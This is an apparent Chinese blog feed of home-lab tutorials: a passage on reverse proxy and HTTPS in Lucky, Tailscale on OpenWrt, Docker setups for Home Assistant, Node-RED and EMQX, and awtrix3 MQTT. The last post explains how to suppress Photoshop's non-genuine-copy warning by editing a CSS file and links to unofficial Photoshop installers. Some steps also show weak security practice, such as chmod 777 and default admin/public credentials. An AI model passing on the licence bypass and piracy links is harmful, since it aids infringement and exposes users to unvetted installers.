<p>备注随便填，添加方式选择ACME，证书颁发机构选择Let’s Encrypt，DNS服务商选择自己的服务商。</p>
<p><img src="/img/lucky/25.webp" alt="img"></p>
<p>和刚才一样，填入AccessKey的ID，Secret，主域名和二级域名。电子邮箱可以使用系统提供的临时邮箱，或者自己的邮箱都可以。算法选择默认的RSA2048。</p>
<p><img src="/img/lucky/26.webp" alt="img"></p>
<p>如果你的公网IP是IPv4，就开启DNS查询强制IPv4，同时启用DNS查询仅使用TCP通道。其他所有选项全部保持默认，并点击添加完成。</p>
<p><img src="/img/lucky/27.webp" alt="img"></p>
<p>证书申请需要稍等一段时间，大概几分钟。成功后就会出现ACME信息，颁发时间和道到期时间。每张免费SSL证书的有效期为三个月，但Lucky在证书到期日会自动续签，不需要人工干预。</p>
<p><img src="/img/lucky/28.webp" alt="img"></p>
<h3 id="Step-5、设置反向代理及HTTPS访问"><a href="#Step-5、设置反向代理及HTTPS访问" class="headerlink" title="Step 5、设置反向代理及HTTPS访问"></a><strong>Step 5、设置反向代理及HTTPS访问</strong></h3><p>转到Web服务菜单，点击“添加Web规则”。</p>
<p><img src="/img/lucky/29.webp" alt="img"></p>
<p>Web服务规则名称随便填，规则开关开启，操作模式选简易模式，监听类型按照你的公网IP类型选择。监听端口这里给出的默认是16666，如果不喜欢，可以自己随便改，只要和局域网中其他服务端口不冲突就行，防火墙自动放行开启。<strong>特别注意，这里一定要开启TLS，否则无法使用HTTPS。</strong></p>
<p><img src="/img/lucky/30.webp" alt="img"></p>
<p>接下来先不要着急添加规则，而是点击“添加Web服务子规则”。实际上，这个所谓的“子规则”，就是你从外网访问的某项服务，比如Home Assistant，或者NAS管理页面。名称还是随便写，规则开关开启。Web服务类型选择“反向代理”。</p>
<p>前端域名&#x2F;地址需要填写你想要从外网访问该服务的二级域名，比如我这个子规则是分配给NAS管理页面的，那我就写nas.xxx.xx或者ugreen.xxx.xx，前缀可以按照自己的喜好编写。</p>
<p>而后端地址则需要写你访问该服务的内网IP+端口号，前面不要忘记加http:&#x2F;&#x2F;，其他选项全部保持默认。</p>
<p><img src="/img/lucky/31.webp" alt="img"></p>
<p>这里有一个需要注意的地方就是BasicAuth认证，也就是基础加密功能。在开启之后，从外网访问时，需要先输入账号和密码，等于是多加了一道保险。对于本身就有密码登录界面的服务来说，是否开启可以根据个人需求。但对于本身没有密码登录界面的服务，比如YACD小猫咪，开启BasicAuth认证还是有必要的。</p>
<p><img src="/img/lucky/32.webp" alt="img"></p>
<p>如果还有其他服务需要外网访问的话，那么还是按照上面的方法，添加新的Web服务子规则，需要多少服务，开几条子规则即可，但是注意二级域名前缀不要冲突。比如我这里就开启了5条：</p>
<p><img src="/img/lucky/33.webp" alt="img"></p>
<p><strong>全部设置好以后，我们还需要把反向代理的端口通过路由器映射出去，才能够正常从外网访问。</strong>和正向代理不同，现在我们只需要映射一个反代端口就可以，不用把每个服务单独的内网端口再映射出去，注意内网端口和外网端口号要保持一致。</p>
<p><img src="/img/lucky/34.webp" alt="img"></p>
<p>端口放出去之后，如果所有设置都正常，就已经可以从外网访问了。比如我现在输入 <a href="https://nas.xxx.xx:8888/">https://nas.xxx.xx:8888</a> ，就可以访问到NAS的设置页面。而且可以看到，域名的前面是有一把锁的，也就是说已经开启了SSL安全访问。</p>
<p><img src="/img/lucky/35.webp" alt="img"></p>
<p>不过这里还有个小问题，就是在输入网址的时候，还是需要带上Https:&#x2F;&#x2F;，否则在某些浏览器中会自动被识别为http，造成无法访问。为了解决这个问题，我们需要在仅输入域名时让浏览器也能够自动跳转到https。</p>
<p>回到Lucky，在Web服务中添加一条全新的Web服务规则(注意不是子规则)。名称随便，操作模式选定制模式，监听端口和前面的反代端口保持一致，TLS一定要禁用！然后点击“默认子规则”</p>
<p><img src="/img/lucky/36.webp" alt="img"></p>
<p>打开默认子规则界面后，Web服务类型选择重定向，然后在默认目标地址中输入：</p>
<p><strong>https:&#x2F;&#x2F;{host}:{port}</strong></p>
<p>并打开万事大吉开关(自动添加请求头)，其他所有选项全部保持默认，添加完成。 </p>
<p><img src="/img/lucky/37.webp" alt="img"></p>
<p>这样一来，在外网访问时我们只需要输入xxx.xx.xxx:端口号，浏览器就会自动跳转到https协议，非常方便。</p>
<p><img src="/img/lucky/38.webp" alt="img"></p>
<p>到此为止，我们就可以从外网使用反向代理+HTTPS方式访问家里的NAS服务器了，这已经是目前最完美的方式。不过有些小伙伴可能还会问，为什么不把最后的反代端口号也去掉，直接输入二级域名访问，岂不是更加优雅？</p>
<p>实际上，HTTPS协议默认的端口为443。当我们输入 <a href="https://xxx.xx.xx/">https://xxx.xx.xx</a> 时，就等同于访问 <a href="https://xxx.xx.xx/">https://xxx.xx.xx:443</a> ，只不过由于通用标准的缘故，443端口在输入时可以省略。</p>
<p>遗憾的是，目前绝大多数家庭宽带80和443端口都是被运营商封闭的，因此只能退而求其次，选择其他端口使用。如果你家宽带是万里挑一的幸运儿，没有被封闭443端口，那么就可以使用443端口作反代，并直接使用域名访问。</p>
<p>443端口是否开放，可以通过站长之家查询，输入域名或者IP和端口号即可：</p>
<p><a href="https://tool.chinaz.com/port">https://tool.chinaz.com/port</a></p>
<p>比如我这里443端口就是关闭状态：</p>
<p><img src="/img/lucky/39.webp" alt="img"></p>
]]></content>
      <categories>
        <category>web</category>
        <category>lucky</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>lucky</tag>
      </tags>
  </entry>
  <entry>
    <title>Tailscale内网穿透、异地组网、远程访问，点对点传输</title>
    <url>/posts/2b9d1ca1/</url>
    <content><![CDATA[<p>• 在软路由&#x2F;iStoreOS上安装Tailscale实现内网穿透、异地组网、远程访问，点对点传输，更好的使用体验！轻松打通内外网！群晖、威联通NAS，替代zerotier</p>
<p><img src="/img/tailscale/1.webp" alt="img"></p>
<p>准备工具：SSH连接工具Finalshell：【<a href="https://www.hostbuf.com/t/988.html">点击进入</a>】</p>
<p>1、开源项目地址：【<a href="https://github.com/adyanth/openwrt-tailscale-enabler/releases">点击进入</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/adyanth/openwrt-tailscale-enabler/releases/download/v1.60.0-e428948-autoupdate/openwrt-tailscale-enabler-v1.60.0-e428948-autoupdate.tgz</span><br><span class="line"></span><br><span class="line"><span class="comment">#版本号自行替换最新的</span></span><br></pre></td></tr></table></figure>

<p>2、解压软件包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar x -zvC / -fopenwrt-tailscale-enabler-v1.60.0-e428948-autoupdate.tgz   </span><br><span class="line"></span><br><span class="line"><span class="comment">#版本号自行替换最新的</span></span><br></pre></td></tr></table></figure>

<p>3、安装依赖包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install libustream-openssl ca-bundle kmod-tun</span><br></pre></td></tr></table></figure>

<p>4、设置开机自启并验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/tailscale <span class="built_in">enable</span></span><br><span class="line"><span class="built_in">ls</span> /etc/rc.d/S*tailscale*</span><br></pre></td></tr></table></figure>

<p>5、启动Tailscale</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/tailscale start</span><br></pre></td></tr></table></figure>

<p>6、获取登录链接，配置路由</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tailscale up</span><br></pre></td></tr></table></figure>

<p>7、Tailscale常用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#退出Tailscale：</span></span><br><span class="line">tailscale <span class="built_in">logout</span></span><br><span class="line"><span class="comment">#关闭Tailscale：</span></span><br><span class="line">tailscale down</span><br><span class="line"><span class="comment">#检查Derp服务器：</span></span><br><span class="line">tailscale netcheck</span><br><span class="line"><span class="comment">#检查Tailscale：</span></span><br><span class="line">tailscale status</span><br></pre></td></tr></table></figure>

<p>8、开启子网网路由（作用：将局域网内的某个设备设为网关，外网就能通过这个设备访问局域网内的任意设备）</p>
<ul>
<li>在Tailscale的管理页面上，单击设备列表右侧的更多图标，禁用密钥过期，并打开子网路由。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tailscale up --accept-routes --advertise-routes=192.168.1.0/24 --accept-dns=<span class="literal">false</span></span><br><span class="line"><span class="comment">#指定 192.168.1.0/24 这个网段</span></span><br><span class="line"></span><br><span class="line">tailscale up --accept-routes --advertise-routes=192.168.1.0/24</span><br><span class="line"><span class="comment">#报错就用这个命令</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/tailscale/2.webp" alt="img"></p>
<ul>
<li>如果是使用<a href="https://github.com/juanfont/headscale">headscale</a>搭建的，可以用下面的命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tailscale up --login-server=http://服务器IP:headscale端口 --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span> --advertise-routes=192.168.1.0/24 --reset</span><br></pre></td></tr></table></figure>

<p>9、<strong>添加接口</strong></p>
<ul>
<li>在OpenWrt上新建一个接口，协议选静态地址，设备选tailscale0，地址为Taliscale管理页面上分配的地址，掩码255.0.0.0 防火墙区域选lan区域（旁路由选lan）。</li>
</ul>
<p><img src="/img/tailscale/3.webp" alt="img"></p>
<p><img src="/img/tailscale/4.webp" alt="img"></p>
<p>10、添加防火墙规则</p>
<ul>
<li>网络——防火墙——自定义规则——把下面的规则添加进去——重启防火墙</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I FORWARD -i tailscale0 -j ACCEPT</span><br><span class="line">iptables -I FORWARD -o tailscale0 -j ACCEPT</span><br><span class="line">iptables -t nat -I POSTROUTING -o tailscale0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
        <category>tailscale</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>tailscale</tag>
      </tags>
  </entry>
  <entry>
    <title>iStoreOS扩容docker分区</title>
    <url>/posts/c3c02c7d/</url>
    <content><![CDATA[<h2 id="扩容Docker分区"><a href="#扩容Docker分区" class="headerlink" title="扩容Docker分区"></a>扩容Docker分区</h2><ul>
<li>ARS2自带是8G EMMC，除开系统占用，会剩余6G多，自动划分到Docker数据分区，常理来说，6G是完全够运行一般的Docker项目。</li>
<li>但是docker项目大小不一，可能有些小伙伴玩的项目体积比较大，6G容量不够， 那么就需要扩容Docker数据分区。</li>
</ul>
<h4 id="开始扩容"><a href="#开始扩容" class="headerlink" title="开始扩容:"></a>开始扩容:</h4><ul>
<li>扩容前，先停用已部署的docker项目，扩容完成后重新部署。若当前无docker项目，直接开始扩容。</li>
<li>确定自己已经挂载了硬盘，可以看挂载点里的信息。比如我的硬盘路径就是&#x2F;mnt&#x2F;sda1。</li>
</ul>
<p><img src="/img/istore-docker/1.webp" alt="img"></p>
<ul>
<li>然后在&#x2F;mnt&#x2F;sda1建立一个docker文件夹，最终路径为：&#x2F;mnt&#x2F;sda1&#x2F;docker。</li>
<li>进入Docker——概况——设置，根目录填入&#x2F;mnt&#x2F;sda1&#x2F;docker，然后保存应用。</li>
</ul>
<p><img src="/img/istore-docker/2.webp" alt="img"></p>
<ul>
<li>扩容完成，然后就能畅快的部署Docker项目了。</li>
</ul>
<p><img src="/img/istore-docker/3.webp" alt="img"></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>用docker安装home assistant，node-red，mqtt-emqx</title>
    <url>/posts/99c1f2ca/</url>
    <content><![CDATA[<h2 id="Home-Assistant"><a href="#Home-Assistant" class="headerlink" title="Home Assistant"></a>Home Assistant</h2><p>一款优秀的家庭自动化平台，您的智能家居好帮手。</p>
<h4 id="1-Docker拉取homeassistant镜像，进入终端，输入下面的命令并回车运行"><a href="#1-Docker拉取homeassistant镜像，进入终端，输入下面的命令并回车运行" class="headerlink" title="1.Docker拉取homeassistant镜像，进入终端，输入下面的命令并回车运行;"></a>1.Docker拉取homeassistant镜像，进入终端，输入下面的命令并回车运行;</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull homeassistant/home-assistant:latest</span><br></pre></td></tr></table></figure>

<p><img src="/img/ha+nodered+mqtt/1.webp" alt="img"></p>
<h4 id="2-接着继续输入如下命令并回车运行，创建homeassistant容器-先别直接复制输入，下方有说明-；"><a href="#2-接着继续输入如下命令并回车运行，创建homeassistant容器-先别直接复制输入，下方有说明-；" class="headerlink" title="2.接着继续输入如下命令并回车运行，创建homeassistant容器(先别直接复制输入，下方有说明)；"></a>2.接着继续输入如下命令并回车运行，创建homeassistant容器(先别直接复制输入，下方有说明)；</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name homeassistant \</span><br><span class="line">  --privileged \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  -e TZ=<span class="string">&quot;Asia/Shanghai&quot;</span> \</span><br><span class="line">  -v /root/homeassistant/config:/config \</span><br><span class="line">  --network=host \</span><br><span class="line">  homeassistant/home-assistant:latest</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>&#x2F;root&#x2F;homeassistant&#x2F;config 用来存放homeassistant的配置文件，按需修改。</p>
<p><img src="/img/ha+nodered+mqtt/2.webp" alt="img"></p>
<h4 id="3-上面2条命令完成以后，管理界面—Docker—容器，就能看到homeassistant已经运行起来了；"><a href="#3-上面2条命令完成以后，管理界面—Docker—容器，就能看到homeassistant已经运行起来了；" class="headerlink" title="3.上面2条命令完成以后，管理界面—Docker—容器，就能看到homeassistant已经运行起来了；"></a>3.上面2条命令完成以后，管理界面—Docker—容器，就能看到homeassistant已经运行起来了；</h4><p><img src="/img/ha+nodered+mqtt/3.webp" alt="img"></p>
<h4 id="4-浏览器打开设备对应IP加上8123端口，例如-http-192-168-1-2-8123-即可进入homeassistant控制台。"><a href="#4-浏览器打开设备对应IP加上8123端口，例如-http-192-168-1-2-8123-即可进入homeassistant控制台。" class="headerlink" title="4.浏览器打开设备对应IP加上8123端口，例如 http://192.168.1.2:8123/ 即可进入homeassistant控制台。"></a>4.浏览器打开设备对应IP加上8123端口，例如 <a href="http://192.168.1.2:8123/">http://192.168.1.2:8123/</a> 即可进入homeassistant控制台。</h4><p><img src="/img/ha+nodered+mqtt/4.webp" alt="img"></p>
<h2 id="Node-RED"><a href="#Node-RED" class="headerlink" title="Node-RED"></a>Node-RED</h2><p>Node-RED，这个项目是由IBM新兴技术服务团队构建的可视化物联网编排工具，可基于浏览器的流程编辑器连接设备、服务器和API应用。可以将Home Assistant接入Node-Red实现自动化。</p>
<h4 id="1-Docker拉取node-red镜像，进入终端，输入下面的命令并回车运行"><a href="#1-Docker拉取node-red镜像，进入终端，输入下面的命令并回车运行" class="headerlink" title="1.Docker拉取node-red镜像，进入终端，输入下面的命令并回车运行;"></a>1.Docker拉取node-red镜像，进入终端，输入下面的命令并回车运行;</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nodered/node-red</span><br></pre></td></tr></table></figure>

<p><img src="/img/ha+nodered+mqtt/5.webp" alt="img"></p>
<h4 id="2-接着继续输入如下命令并回车运行，创建node-red容器-先别直接复制输入，下方有说明-；"><a href="#2-接着继续输入如下命令并回车运行，创建node-red容器-先别直接复制输入，下方有说明-；" class="headerlink" title="2.接着继续输入如下命令并回车运行，创建node-red容器(先别直接复制输入，下方有说明)；"></a>2.接着继续输入如下命令并回车运行，创建node-red容器(先别直接复制输入，下方有说明)；</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name=<span class="string">&quot;nodered&quot;</span> \</span><br><span class="line">  --net=bridge \</span><br><span class="line">  --restart unless-stopped \</span><br><span class="line">  -e TZ=<span class="string">&quot;Asia/Shanghai&quot;</span> \</span><br><span class="line">  -p 1880:1880/tcp \</span><br><span class="line">  -v /root/node-red/nodered:/data:rw \</span><br><span class="line">  nodered/node-red</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>&#x2F;root&#x2F;node-red&#x2F;nodered 用来存放node-red的数据文件，按需修改。</p>
<p><img src="/img/ha+nodered+mqtt/6.webp" alt="img"></p>
<h4 id="3-接着输入以下命令-解决node-red容器启动不了的bug-；"><a href="#3-接着输入以下命令-解决node-red容器启动不了的bug-；" class="headerlink" title="3.接着输入以下命令(解决node-red容器启动不了的bug)；"></a>3.接着输入以下命令(解决node-red容器启动不了的bug)；</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> -R 777 /root/node-red/nodered</span><br></pre></td></tr></table></figure>

<p><img src="/img/ha+nodered+mqtt/7.webp" alt="img"></p>
<h4 id="4-上面3条命令完成以后，管理界面—Docker—容器，找到node-red重启，然后node-red就运行起来了；"><a href="#4-上面3条命令完成以后，管理界面—Docker—容器，找到node-red重启，然后node-red就运行起来了；" class="headerlink" title="4.上面3条命令完成以后，管理界面—Docker—容器，找到node-red重启，然后node-red就运行起来了；"></a>4.上面3条命令完成以后，管理界面—Docker—容器，找到node-red重启，然后node-red就运行起来了；</h4><p><img src="/img/ha+nodered+mqtt/8.webp" alt="img"></p>
<h4 id="5-浏览器打开设备对应IP加上1880端口，例如-http-192-168-1-2-1880-即可进入node-red控制台。"><a href="#5-浏览器打开设备对应IP加上1880端口，例如-http-192-168-1-2-1880-即可进入node-red控制台。" class="headerlink" title="5.浏览器打开设备对应IP加上1880端口，例如 http://192.168.1.2:1880/ 即可进入node-red控制台。"></a>5.浏览器打开设备对应IP加上1880端口，例如 <a href="http://192.168.1.2:1880/">http://192.168.1.2:1880/</a> 即可进入node-red控制台。</h4><p><img src="/img/ha+nodered+mqtt/9.webp" alt="img"></p>
<h2 id="MQTT-EMQX"><a href="#MQTT-EMQX" class="headerlink" title="MQTT-EMQX"></a>MQTT-EMQX</h2><p>EMQX基于Erlang&#x2F;OTP平台开发的MQTT消息服务器，是开源社区中最流行的MQTT 消息服务器，支持丰富的物联网协议，包括 MQTT、LwM2M、MQTT-SN、CoAP、 LoRaWAN、 HTTP和WebSocket等。</p>
<h4 id="1-Docker拉取emqx镜像并创建容器，进入终端，输入下面的命令并回车运行"><a href="#1-Docker拉取emqx镜像并创建容器，进入终端，输入下面的命令并回车运行" class="headerlink" title="1.Docker拉取emqx镜像并创建容器，进入终端，输入下面的命令并回车运行;"></a>1.Docker拉取emqx镜像并创建容器，进入终端，输入下面的命令并回车运行;</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name emqx --restart unless-stopped -p 1883:1883 -p 8081:8081 -p 8083:8083 -p 8883:8883 -p 8084:8084 -p 18083:18083 emqx/emqx</span><br></pre></td></tr></table></figure>

<p><img src="/img/ha+nodered+mqtt/10.webp" alt="img"></p>
<h4 id="2-上面命令完成以后，管理界面—Docker—容器，就能看到emqx已经运行起来了；"><a href="#2-上面命令完成以后，管理界面—Docker—容器，就能看到emqx已经运行起来了；" class="headerlink" title="2.上面命令完成以后，管理界面—Docker—容器，就能看到emqx已经运行起来了；"></a>2.上面命令完成以后，管理界面—Docker—容器，就能看到emqx已经运行起来了；</h4><p><img src="/img/ha+nodered+mqtt/11.webp" alt="img"></p>
<h4 id="3-浏览器打开设备对应IP加上18083端口，例如-http-192-168-1-2-18083-即可进入eqmx控制台。"><a href="#3-浏览器打开设备对应IP加上18083端口，例如-http-192-168-1-2-18083-即可进入eqmx控制台。" class="headerlink" title="3.浏览器打开设备对应IP加上18083端口，例如 http://192.168.1.2:18083/ 即可进入eqmx控制台。"></a>3.浏览器打开设备对应IP加上18083端口，例如 <a href="http://192.168.1.2:18083/">http://192.168.1.2:18083/</a> 即可进入eqmx控制台。</h4><p><strong>说明：</strong></p>
<p>初始帐号：admin</p>
<p>初始密码：public</p>
<p>连接端口是1883</p>
<p><img src="/img/ha+nodered+mqtt/12.webp" alt="img"></p>
<p><img src="/img/ha+nodered+mqtt/13.webp" alt="img"></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>docker</category>
        <category>awtrix</category>
        <category>homeassistant</category>
      </categories>
      <tags>
        <tag>homeassistant</tag>
        <tag>mqtt</tag>
        <tag>nodered</tag>
      </tags>
  </entry>
  <entry>
    <title>awtrix3介绍和相关软件，mqtt使用教程</title>
    <url>/posts/8ebfdc59/</url>
    <content><![CDATA[<h1 id="awtrix3-主页"><a href="#awtrix3-主页" class="headerlink" title="awtrix3 主页"></a>awtrix3 主页</h1><p><a href="https://blueforcer.github.io/awtrix3/#/quickstart">https://blueforcer.github.io/awtrix3/#/quickstart</a></p>
<h1 id="awtrix3-GitHub"><a href="#awtrix3-GitHub" class="headerlink" title="awtrix3 GitHub"></a>awtrix3 GitHub</h1><p><a href="https://github.com/Blueforcer/awtrix3">https://github.com/Blueforcer/awtrix3</a></p>
<h1 id="awtrix-flows"><a href="#awtrix-flows" class="headerlink" title="awtrix flows"></a>awtrix flows</h1><p><a href="https://flows.blueforcer.de/">https://flows.blueforcer.de/</a></p>
<h1 id="bilibili介绍视频"><a href="#bilibili介绍视频" class="headerlink" title="bilibili介绍视频"></a>bilibili介绍视频</h1><p><a href="https://www.bilibili.com/video/BV1rs421u7br/?spm_id_from=333.337.search-card.all.click&vd_source=746a190457bf6404cc501e8cacad5ae4">https://www.bilibili.com/video/BV1rs421u7br/?spm_id_from=333.337.search-card.all.click&amp;vd_source=746a190457bf6404cc501e8cacad5ae4</a></p>
<h1 id="一、服务端"><a href="#一、服务端" class="headerlink" title="一、服务端"></a>一、服务端</h1><h2 id="1-1-下载"><a href="#1-1-下载" class="headerlink" title="1.1 下载"></a>1.1 下载</h2><p>EMQ 服务端下载地址</p>
<p><a href="https://www.emqx.com/zh/downloads/broker/v5.3.0">https://www.emqx.com/zh/downloads/broker/v5.3.0</a></p>
<h2 id="1-2-相关命令"><a href="#1-2-相关命令" class="headerlink" title="1.2 相关命令"></a>1.2 相关命令</h2><p>官方命令行说明<a href="https://docs.emqx.com/zh/emqx/v5.2/admin/cli.html#admins">https://docs.emqx.com/zh/emqx/v5.2/admin/cli.html#admins</a></p>
<h3 id="（1）启动"><a href="#（1）启动" class="headerlink" title="（1）启动"></a>（1）启动</h3><p>cd到bin目录下，然后输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\emqx start</span><br><span class="line">或者有交互的启动</span><br><span class="line">.\emqx.cmd console</span><br></pre></td></tr></table></figure>

<p> 就可以启动MQTT服务端</p>
<p><img src="/img/awtrix3/1.webp" alt="img"></p>
<h3 id="（2）关闭"><a href="#（2）关闭" class="headerlink" title="（2）关闭"></a>（2）关闭</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">emqx stop</span><br></pre></td></tr></table></figure>

<p><img src="/img/awtrix3/2.webp" alt="img"> </p>
<h3 id="（3）修改用户名和密码"><a href="#（3）修改用户名和密码" class="headerlink" title="（3）修改用户名和密码"></a>（3）修改用户名和密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">emqx ctl admins passwd 用户名 密码</span><br></pre></td></tr></table></figure>

<p><img src="/img/awtrix3/3.webp" alt="img"></p>
<p>创建、修改、删除账户</p>
<p><img src="/img/awtrix3/4.webp" alt="img"> </p>
<h2 id="1-3-后台管理"><a href="#1-3-后台管理" class="headerlink" title="1.3 后台管理"></a>1.3 后台管理</h2><p>访问 <a href="http://127.0.0.1:18083/">http://127.0.0.1:18083/</a> 然后输入上一步配置的用户名和密码即可登录EMQX后台，下面列举一下基本常用的板块。</p>
<h3 id="（1）MQTT配置"><a href="#（1）MQTT配置" class="headerlink" title="（1）MQTT配置"></a>（1）MQTT配置</h3><p>如果要传输比较大的数据，如图像数据，我们可以在“MQTT配置”中先设置一下最大报文大小（上限是256M）</p>
<p><img src="/img/awtrix3/5.webp" alt="img"></p>
<h3 id="（2）集群概览"><a href="#（2）集群概览" class="headerlink" title="（2）集群概览"></a>（2）集群概览</h3><p>在“集群概览”板块中，我们可以看到当前连接到本服务的客户端数量，订阅的主题数等信息 </p>
<p><img src="/img/awtrix3/6.webp" alt="img"></p>
<h3 id="（3）客户端"><a href="#（3）客户端" class="headerlink" title="（3）客户端"></a>（3）客户端</h3><p>在“客户端”板块中，我们可以看到客户端的具体信息</p>
<p><img src="/img/awtrix3/7.webp" alt="img"></p>
<h3 id="（4）订阅管理"><a href="#（4）订阅管理" class="headerlink" title="（4）订阅管理"></a>（4）订阅管理</h3><p>在“订阅管理”板块中，我们可以看到当前有哪些主题，以及主题被客户端订阅的情况</p>
<p><img src="/img/awtrix3/8.webp" alt="img"></p>
<h3 id="（5）-Websocket客户端"><a href="#（5）-Websocket客户端" class="headerlink" title="（5） Websocket客户端"></a>（5） Websocket客户端</h3><p>我们可以用自带的客户端来测试连接服务端</p>
<p><img src="/img/awtrix3/9.webp" alt="img"></p>
<p>这里ip为127.0.0.1，端口为8083，用户名密码可以随便填，然后点击连接按钮</p>
<p><img src="/img/awtrix3/10.webp" alt="img"></p>
<p>连接后可以订阅一个主题</p>
<p><img src="/img/awtrix3/11.webp" alt="img"></p>
<p>当客户端向指定主题发布信息后，可以看到所有订阅了该主题的客户端都会收到信息</p>
<p><img src="/img/awtrix3/12.webp" alt="img"></p>
<p>看到可以发布订阅并接收消息后，服务端基本就是可以正常使用的。 </p>
<h3 id="（6）客户端认证"><a href="#（6）客户端认证" class="headerlink" title="（6）客户端认证"></a>（6）客户端认证</h3><p>如果不想任意用户都可以使用我们的MQTT服务，我们可以使用客户端认证功能来设置账号密码。 </p>
<p><img src="/img/awtrix3/13.webp" alt="img"></p>
<p>这里使用密码认证</p>
<p><img src="/img/awtrix3/14.webp" alt="img"></p>
<p>这里使用内置数据库</p>
<p><img src="/img/awtrix3/15.webp" alt="img"></p>
<p>这里使用用户名认证，使用默认加密方式</p>
<p><img src="/img/awtrix3/16.webp" alt="img"></p>
<p>创建后点击用户管理</p>
<p><img src="/img/awtrix3/17.webp" alt="img"></p>
<p>点击添加一个用户名和密码</p>
<p><img src="/img/awtrix3/18.webp" alt="img"></p>
<p><img src="/img/awtrix3/19.webp" alt="img"></p>
<p><img src="/img/awtrix3/20.webp" alt="img"></p>
<p>此时我们就启用了客户端认证。如果想控制每个客户端的权限，如控制客户端是否允许发布、订阅，这就需要使用“客户端授权”功能。</p>
<h1 id="二、客户端"><a href="#二、客户端" class="headerlink" title="二、客户端"></a>二、客户端</h1><p>这里使用的是MQTTX，下载地址：</p>
<p><a href="https://mqttx.app/zh/downloads">MQTTX 下载</a></p>
<p><img src="/img/awtrix3/21.webp" alt="img"> </p>
<p>下载安装后打开，我们可以先新建一个连接，注意修改一下ip和端口。如果启用了客户端认证，还需填写正确的账号和密码。</p>
<p><img src="/img/awtrix3/22.webp" alt="img"></p>
<p>连接成功后可以点击添加订阅一个主题</p>
<p><img src="/img/awtrix3/23.webp" alt="img"></p>
<p>订阅后，我们可以向该主题发送一个信息</p>
<p><img src="/img/awtrix3/24.webp" alt="img"></p>
<p>可以看到另一个订阅了该主题的客户端也收到了信息</p>
<p><img src="/img/awtrix3/25.webp" alt="img"></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>awtrix</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Photoshop 2024恶意风险盗版提示弹窗解决办法</title>
    <url>/posts/a6addd3/</url>
    <content><![CDATA[<p>英文弹窗”This non-genuine Adobe app will bedisabled soon“<br>解决办法：修改系统目录下的UXP扩展com.adobe.ccx.start样式文件<br>com.adobe.ccx.start-7.4.0（不同版本数字可能不同，目前2024 v25.6版本开始以后是7.4.0）<br>C:\Program Files\Common Files\Adobe\UXP\extensions\com.adobe.ccx.start-7.4.0\css\styles.css<br>搜索styles.css样式文件以下关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background-color&quot;:&quot;#1473e6</span><br><span class="line">background-color&quot;:&quot;#d7373f</span><br></pre></td></tr></table></figure>
<p>全部替换为 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display&quot;:&quot;none</span><br></pre></td></tr></table></figure>
<h2 id="Photoshop-2024安装包下载地址："><a href="#Photoshop-2024安装包下载地址：" class="headerlink" title="Photoshop 2024安装包下载地址："></a>Photoshop 2024安装包下载地址：</h2><p>Photoshop 2024-25.12.0.806 </p>
<p><a href="https://www.123pan.com/s/zuYeVv-t3bbd?%E6%8F%90%E5%8F%96%E7%A0%81:YTTd">https://www.123pan.com/s/zuYeVv-t3bbd?提取码:YTTd</a></p>
<h2 id="各个版本的Adobe软件下载地址："><a href="#各个版本的Adobe软件下载地址：" class="headerlink" title="各个版本的Adobe软件下载地址："></a>各个版本的Adobe软件下载地址：</h2><p>PS2023 <a href="https://www.123pan.com/s/A6cA-rKAJh">https://www.123pan.com/s/A6cA-rKAJh</a><br>PS2022,2021<a href="https://www.123pan.com/s/A6cA-YkAJh">https://www.123pan.com/s/A6cA-YkAJh</a><br><a href="https://pan.baidu.com/s/1kwBrkZ5SrlOWocGUn65iVw?pwd=2023">https://pan.baidu.com/s/1kwBrkZ5SrlOWocGUn65iVw?pwd=2023</a><br><a href="https://pan.baidu.com/s/1hJZtjUWLQ-RGV5CGGKPO8w?pwd=2023">https://pan.baidu.com/s/1hJZtjUWLQ-RGV5CGGKPO8w?pwd=2023</a></p>
<p><a href="http://www.kkx.net/soft/76871.html">PS2023下载-Adobe PhotoShop 2023下载 v24.5.0.500直装完整版-KK下载站 (kkx.net)</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>photoshop</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>photoshop</tag>
